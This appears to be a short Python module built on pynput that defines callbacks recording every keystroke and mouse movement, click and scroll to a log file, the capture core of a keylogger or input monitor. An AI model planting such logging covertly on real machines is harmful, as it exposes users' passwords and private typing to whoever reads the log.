from pynput import keyboard
from pynput.mouse import Listener
from logging_utils import append_log

def save_data(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = "SPACE"
        elif key == keyboard.Key.esc:
            current_key = "ESC"
        else:
            current_key = f" {str(key)} "
            print(f"Key captured: {current_key}")
    append_log(current_key)



def on_move(x, y):
    append_log(f"Mouse moved to {x}, {y}")

def on_click(x, y, button, pressed):
    action = "pressed" if pressed else "released"
    append_log(f"Mouse {action} at {x}, {y}")

def on_scroll(x, y, dx, dy):
    append_log(f"Mouse scrolled at {x}, {y} with delta {dx}, {dy}")